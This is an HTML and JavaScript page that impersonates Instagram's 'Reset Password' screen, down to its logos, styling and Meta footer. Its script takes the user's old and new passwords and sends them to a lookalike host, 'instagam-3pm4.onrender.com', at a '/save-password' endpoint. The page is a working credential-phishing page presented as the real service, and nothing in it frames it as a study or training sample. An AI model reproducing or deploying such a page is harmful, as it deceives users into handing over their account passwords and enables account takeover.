    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Reset Password</title>

        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            }

            body {
                background: #fafafa;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }

            .container {
                width: 350px;
                background: #fff;
                border: 1px solid #dbdbdb;
                padding: 40px;
                text-align: center;
            }

            .logo-container {
                margin-bottom: 25px;
            }

            .insta-icon {
                width: 80px;
                height: 80px;
                display: block;
                margin: 0 auto 10px;
            }

            .insta-text {
                width: 180px;
                display: block;
                margin: 0 auto;
            }

            h3 {
                color: #262626;
                margin-bottom: 20px;
                font-size: 20px;
            }

            input {
                width: 100%;
                padding: 10px;
                margin-bottom: 10px;
                border: 1px solid #dbdbdb;
                border-radius: 4px;
                background: #fafafa;
                font-size: 14px;
            }

            input:focus {
                outline: none;
                border-color: #a8a8a8;
            }

            button {
                width: 100%;
                padding: 10px;
                background: #0095f6;
                color: white;
                border: none;
                border-radius: 8px;
                font-size: 14px;
                font-weight: 600;
                cursor: pointer;
            }

            button:hover {
                background: #1877f2;
            }

            .message {
                margin-top: 15px;
                color: green;
                font-size: 14px;
            }

            .footer {
                margin-top: 30px;
                text-align: center;
                font-size: 12px;
                color: #8e8e8e;
                padding: 20px;
                max-width: 900px;
            }

            .footer-links {
                display: flex;
                flex-wrap: wrap;
                justify-content: center;
                gap: 12px;
                margin-bottom: 15px;
            }

            .footer-links a {
                text-decoration: none;
                color: #8e8e8e;
            }

            .footer-links a:hover {
                text-decoration: underline;
            }

            .footer-bottom {
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 15px;
                flex-wrap: wrap;
            }

            .footer-bottom select {
                border: none;
                background: transparent;
                color: #8e8e8e;
                font-size: 12px;
            }
        </style>
    </head>

    <body>

        <div class="container">

            <div class="logo-container">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Icon"
                    class="insta-icon">

                <img src="./images/instagram-logo.png" alt="Instagram" class="insta-text">
            </div>

            <h3>Reset Password</h3>

            <form id="resetForm">

                <input type="password" id="oldPassword" placeholder="Old Password" required>

                <input type="password" id="newPassword" placeholder="New Password" required>

                <input type="password" id="confirmPassword" placeholder="Confirm New Password" required>

                <button type="submit">
                    Change Password
                </button>

            </form>

            <div id="message" class="message"></div>

        </div>

        <footer class="footer">

            <div class="footer-links">
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Locations</a>
                <a href="#">Popular</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Meta AI</a>
                <a href="#">Threads</a>
                <a href="#">Contact Uploading & Non-Users</a>
                <a href="#">Meta Verified</a>
            </div>

            <div class="footer-bottom">
                <select>
                    <option>English</option>
                    <option>Tamil</option>
                    <option>Hindi</option>
                </select>

                <span>© 2026 Instagram from Meta</span>
            </div>

        </footer>

    <script>
    document.getElementById("resetForm").addEventListener("submit", async (e) => {
        e.preventDefault();

        const oldPassword = document.getElementById("oldPassword").value;
        const newPassword = document.getElementById("newPassword").value;
        const confirmPassword = document.getElementById("confirmPassword").value;

        const messageBox = document.getElementById("message");

        // ✅ Validate passwords match
        if (newPassword !== confirmPassword) {
            messageBox.style.color = "red";
            messageBox.innerText = "Passwords do not match";
            return;
        }

        try {
            const res = await fetch("https://instagam-3pm4.onrender.com/save-password", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    oldPassword,
                    newPassword
                })
            });

            const data = await res.json(); // ✅ FIXED

            messageBox.style.color = "green";
            messageBox.innerText = data.message;

        } catch (error) {
            messageBox.style.color = "red";
            messageBox.innerText = "Unable to connect to server";
        }
    });
    </script>

    </body>

    </html>
